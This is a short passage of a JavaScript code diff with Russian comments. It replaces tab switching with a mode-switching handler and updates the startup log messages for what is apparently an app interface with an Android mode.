+    // ============= ПЕРЕКЛЮЧЕНИЕ РЕЖИМОВ =============
+    document.querySelectorAll('.mode-btn').forEach(btn => {
         btn.onclick = () => {
-            document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
-            document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
-            btn.classList.add('active');
-            const tab = document.getElementById(`${btn.getAttribute('data-tab')}Tab`);
-            if (tab) tab.classList.add('active');
+            switchMode(btn.getAttribute('data-mode'));
         };
     });
     
-    addLog("✅ ГОТОВ К РАБОТЕ", "success");
+    addLog("✅ ИНТЕРФЕЙС ЗАГРУЖЕН", "success", false);
+    addLog("✅ ANDROID ИНТЕРФЕЙС ГОТОВ", "success", true);
 }
 
 // Запуск
